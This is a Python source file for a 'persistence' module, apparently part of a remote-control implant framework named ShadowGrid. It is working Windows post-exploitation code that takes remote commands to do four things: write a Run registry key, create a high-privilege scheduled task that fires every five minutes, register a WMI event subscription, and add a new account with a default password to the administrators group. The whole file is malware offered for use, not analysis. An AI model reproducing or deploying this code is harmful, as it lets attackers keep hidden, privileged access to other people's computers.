"""持久化模块"""

from modules.api import ModuleBase


class PersistenceModule(ModuleBase):
    @property
    def name(self):
        return "persistence"

    @property
    def description(self):
        return "持久化模块"

    @property
    def author(self):
        return "帅丘"

    @property
    def version(self):
        return "2.0.0"

    def handle(self, cmd):
        t = cmd.get("type")
        p = cmd.get("payload")
        action = p.get("action") if p else None
        if action == "registry":
            return self._persist_registry(p)
        elif action == "task":
            return self._persist_task(p)
        elif action == "wmi":
            return self._persist_wmi(p)
        elif action == "hidden_user":
            return self._persist_hidden_user(p)
        return {"status": "error", "result": "Unknown action", "result_type": "error"}

    def get_commands(self):
        return ["persist"]

    def _persist_registry(self, payload):
        try:
            import sys
            if not sys.platform.startswith('win'):
                return {"status": "error", "result": "Windows only", "result_type": "error"}
            exe_path = payload.get("path", "") if payload else ""
            if not exe_path:
                return {"status": "error", "result": "Need path", "result_type": "error"}
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, "ShadowGrid", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return {"status": "ok", "result": "Registry created", "result_type": "ok"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _persist_task(self, payload):
        try:
            import sys
            if not sys.platform.startswith('win'):
                return {"status": "error", "result": "Windows only", "result_type": "error"}
            exe_path = payload.get("path", "") if payload else ""
            name = payload.get("name", "SGTask") if payload else "SGTask"
            if not exe_path:
                return {"status": "error", "result": "Need path", "result_type": "error"}
            cmd = f'schtasks /create /tn "{name}" /tr "{exe_path}" /sc minute /mo 5 /rl highest'
            __import__('subprocess').run(cmd, shell=True, capture_output=True, timeout=10)
            return {"status": "ok", "result": "Task created", "result_type": "ok"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _persist_wmi(self, payload):
        try:
            import sys
            if not sys.platform.startswith('win'):
                return {"status": "error", "result": "Windows only", "result_type": "error"}
            exe_path = payload.get("path", "") if payload else ""
            if not exe_path:
                return {"status": "error", "result": "Need path", "result_type": "error"}
            ps = f"$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{Name='SG';EventNamespace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA Win32_PerfFormattedData_PerfOS_System'}}; $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{Name='SGC';CommandLineTemplate='{exe_path}'}}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}"
            __import__('subprocess').run(['powershell', '-Command', ps], capture_output=True, timeout=30)
            return {"status": "ok", "result": "WMI created", "result_type": "ok"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}

    def _persist_hidden_user(self, payload):
        try:
            import sys
            if not sys.platform.startswith('win'):
                return {"status": "error", "result": "Windows only", "result_type": "error"}
            username = payload.get("username", "HiddenUser") if payload else "HiddenUser"
            password = payload.get("password", "Password123!") if payload else "Password123!"
            __import__('subprocess').run(f"net user {username} {password} /add", shell=True, capture_output=True, timeout=5)
            __import__('subprocess').run(f"net localgroup administrators {username} /add", shell=True, capture_output=True, timeout=5)
            return {"status": "ok", "result": f"Hidden user: {username}", "result_type": "ok"}
        except Exception as e:
            return {"status": "error", "result": str(e), "result_type": "error"}


module = PersistenceModule()
